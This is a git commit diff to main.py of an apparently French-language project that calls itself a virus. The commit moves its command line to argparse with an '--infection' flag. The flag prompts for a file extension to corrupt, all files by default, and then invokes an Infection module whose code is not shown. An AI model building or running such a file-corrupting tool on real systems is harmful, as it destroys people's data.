7dccecc6e8fed0fd4bb9cbed3165677b9ef60c76
Patson <cardin.tiako@gmail.com>
2022-09-21 05:46:55 +0200

    ⚡ pass to argparse

--- main.py
+++ main.py
@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 """ATTENTION A TESTER DANS UN DOSSIER CONTENANT DES FICHIERS INUTILISES !!!!!
 
 
@@ -12,23 +13,17 @@ from module.infection import Infection
 import sys
 
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "-i", "--infection", help="Infecte les fichiers contenus dans le dossier ou se trouve le main.py", action="store_true")
 
-    if len(sys.argv) != 2:
-        raise Exception("Entrez -h pour voir la liste des options disponible")
+    args = parser.parse_args()
 
-    if sys.argv[1] == "-h":
-        try:
-            with open("./module/help.txt") as help:
-                print(help.read())
-        except FileNotFoundError:
-            print("Fichier help Introuvable")
-
-    elif sys.argv[1] == "-infection":
+    if args.infection:
         extension = input(
-            "Entrez l'extension des fichiers (ex : txt , pptx) à corrompre (par défaut tous les fichiers) : ")
+            "Entrez l'extension des fichiers (ex : txt , pptx) à corrompre (par défaut corrompt tous les fichiers) : ")
         virus = Infection(extension)
         virus.infect()
-
     else:
-        raise Exception(
-            "Entrez 'python3 main.py -h' pour voir la liste des options disponibles")
+        print(
+            "Entrez 'python3 main.py -h' pour voir la liste des options disponibles\n")
